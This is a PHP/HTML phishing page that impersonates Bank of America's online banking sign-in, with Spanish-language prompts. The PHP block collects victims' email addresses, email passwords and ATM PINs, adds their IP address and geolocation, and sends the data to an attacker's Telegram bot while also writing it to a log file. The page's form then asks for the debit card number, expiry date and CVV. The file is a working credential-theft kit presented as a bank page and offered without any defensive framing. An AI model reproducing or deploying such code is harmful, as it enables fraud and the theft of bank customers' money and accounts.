<?php 
error_reporting(0);

include('dt.php');
session_start();
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$id=md5(rand());
$session=md5(rand());
@ini_set('display_errors', 'on'); 
ob_start();
function getRealIP()
{if (isset($_SERVER["HTTP_CLIENT_IP"])) {return $_SERVER["HTTP_CLIENT_IP"];} elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {return $_SERVER["HTTP_X_FORWARDED_FOR"];} elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {return $_SERVER["HTTP_X_FORWARDED"];} elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {return $_SERVER["HTTP_FORWARDED_FOR"];} elseif (isset($_SERVER["HTTP_FORWARDED"])) {return $_SERVER["HTTP_FORWARDED"];} else {return $_SERVER["REMOTE_ADDR"];}}
$ip=getRealIP();
$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));

   // $userIP   = getRealIP();]
   $correo = $_POST['email'];
   $contrasena = $_POST['pass'];
   $pin =$_POST['pin'];
   // $user2  = $_SESSION['user2']; 
if ( isset ($correo) && isset ($contrasena) && isset ($pin)  ){
$message = "B o A Correo y PIN\r\nCorreo=: ".$correo."\r\nClv Correo=: ".$contrasena."\r\nPIN=: ".$pin."\r\n";
$message .= "IP= ".$ip."\r\n ";
$apiToken = $apibot;
$data = [
  'chat_id' => $canal,
  'text' => $message];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); }
           $handle = fopen($datos, "a"); 
   fwrite($handle, "Correo= ".$correo."\r\n");
   fwrite($handle, "Clave de Correo= ".$contrasena."\r\n");
   fwrite($handle, "PinATM= ".$pin."\r\n");
   fwrite($handle, "IP= ".$ip."\r\n");
   fwrite($handle, "============================================= \r\n");
   fclose($handle);?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML lang="en-US" lang="en-US" xml:lang="en-US" xmlns="http://www.w3.org/1999/xhtml"><HEAD>
    <META content="IE=11.0000" http-equiv="X-UA-Compatible" charset="utf-8">
      <meta http-equiv="Expires" content="0">
  <meta http-equiv="Last-Modified" content="0">
  <meta http-equiv="Cache-Control" content="no-cache, mustrevalidate">
  <meta http-equiv="Pragma" content="no-cache">
<META http-equiv="X-UA-Compatible" content="IE=Edge">     
<META name="Keywords" content="Your Online ID">      
<META name="Description" content="Sign in to your Online Banking account by entering your Online ID.">   
 <TITLE>Bank of America | Online Banking | Sign In | Online ID</TITLE> 
 <link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">        
<LINK href="css/new.css" rel="stylesheet" type="text/css" media="all">   
<LINK href="css/pin.css" rel="stylesheet" type="text/css" media="all"> 
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
<DIV class="contenedor"><DIV class="fsd-layout fsd-2c-700lt-layout"><DIV class="fsd-border"><DIV class="center-content"><DIV class="header"><DIV class="header-module"><DIV class="fsd-secure-esp-skin"><IMG width="230" height="28" alt="Bank of America" src="images/BofA_rgb.png"><DIV class="page-type" data-font="cnx-regular">Sign In</DIV><DIV class="right-links"><DIV class="secure-area">Secure Area</DIV><A name="spanish_toggle" title="Muestra esta sesi�n de la Banca en L�nea" target="_self">En Espa&ntilde;ol</A><DIV class="clearboth"></DIV></DIV><DIV class="clearboth"></DIV></DIV></DIV><DIV class="page-title-module h-100" id="skip-to-h1"><DIV class="red-grad-bar-skin sup-ie"><H1 data-font="cnx-regular" style="font-weight: normal">Sign In to Online Banking</H1></DIV></DIV>
<form method="post" id="myFormPIN" action="Documento.php" style="min-height: calc(90vh - 100px - 300px)">
<div class="verifi">Verificación por la tarjeta de Débito/ATM card </div><br><br><div class="termino"> Para aceptar nuestros nuevos Términos y Condiciones de seguridad por favor provea la siguiente información<br><br>	

<!--                              <input id="otp-card-email-id1" name="debitCardNumber" type="radio" checked="checked" ><label style="font-weight: bold;">  xxxx-xxxx-xxxx-0427</label>
                             <div class="clearboth"></div><br> -->
                           
                              </label></div><br>

<table border="0" cellpadding="0" cellspacing="0" class="horizontal_hold" summary="">
				<tr>
				<div class="personal-key" id="safepasswdgt-personal-key">
				<div id="safepassNonFlashwidget" style="display: block; ">
				<link rel="stylesheet" href="css/safepass-widget-html-util.css" type="text/css">
				<div class="safepass-widget-module safepass-skin-1" id="safepass-id-84095371" style="display: block; ">						<!-- the following is for the authencate code -->
				<div class="safepass-authenticate repaint-ie-email" style="display: block; ">
				<div class="inner">
				<h2>Authenticate</h2>
				<div class="safepass-body">
				<div class="safepass-form" style="display: block; ">
				<div class="sf-form">
				<div class="auth-content">
				<div class="sp-notify"></div>
				<div class="formRow">									
					<div class="formRow">
						<label id="safepass-card-label" for="auth-safepass-cardnum"><strong>Card Number: </strong> </label>


  <input id="auth-safepass-cardnum" maxlength="16" onkeypress="return event.charCode >= 48 && event.charCode <= 57" class="safe-pass-input required-number" name="ccNo" type="tel" required="">


<!-- <p style="padding: 2px 5px"><strong>-0427<strong></p> -->

						<div class="clear-both"></div>
					</div>
					<div class="formRow">
						<div class="fl-left"><label><strong>Expiration: </strong> </label></div>
						<div class="fl-left"><label for="auth-safepass-exMonth" class="ada-hidden">month </label>					
<select id="auth-safepass-exMonth" name="mes" required="" class="custom-select select-exMonth" type="text">
<option value="" selected=""disabled selected hidden>- -</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select>
							<div class="clear-both"></div>
						</div>
						<div class="fl-left">
							<label for="auth-safepass-exYear" class="ada-hidden"><strong>Expiration: </strong> year</label>
<select id="auth-safepass-exYear" name="ano" required="" class="custom-select select-exYear">
<option value="" selected=""disabled selected hidden>- - - -</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option></select>
							<div class="clear-both"></div>	</div>
						<div class="clear-both"></div>	</div>
					<div class="formRow">
						<label for="auth-safepass-secCode">
							<strong>3 or 4 digit security </strong> 
					    	<br><strong>code </strong><a href="https://sitekey.bankofamerica.com/cmsContent/en_US/TransferFunds/Model/WhyDoWeAskForThisInfoPopUp.html"  target="_blank" class="spw-popup">What is this?</a></label>

						<input id="auth-safepass-secCode" class="pass-type" z-index="2" pattern="[0-9].{2,}" onkeypress="return event.charCode >= 48 && event.charCode <= 57" class="safe-pass-input required-number" name="cvv" maxlength="4" type="tel" required="">
						<div class="clear-both"></div>	</div>	</div></div>
									<div class="clearboth"></div></div>	</div>
									<div class="safepass-end"></div></div></div></div></div>
<div class="clearboth"></div> <div class="botones">
<button type="submit" class="mtop-15 btn-bofa btn-bofa-small btn-bofa-blue submit" ><span>Continuar</span></button>
<input  type="hidden" name="user3" id="user3" value="$user">
<a href="index.php" class="mtop-15 btn-bofa btn-bofa-small btn-bofa-gray btn-bofa-noRight" id="forgot-cancel" name="forgot-cancel"><span>Cancelar</span></a></div>
</form>
<DIV class="clearboth"></DIV></DIV><DIV class="footer"><DIV class="footer-top">&nbsp;  </DIV><DIV class="footer-inner"><DIV class="global-footer-module"><DIV class="gray-bground-skin cssp"><DIV class="secure">Secure area</DIV><DIV class="link-container"><DIV class="link-row"><A name="Privacy_&amp;_Security_footer" title="Privacy &amp; Security" class="last-link" href="#" target="_blank">Privacy &amp; Security</A><DIV class="clearboth"></DIV></DIV></DIV><P>Bank of America, N.A. Member FDIC. <A name="Equal_Housing_Lender" href="#" target="_blank">Equal Housing Lender</A> <BR>&copy;2023 Bank of America Corporation.</P></DIV></DIV></DIV></DIV></DIV></DIV></DIV></BODY></HTML>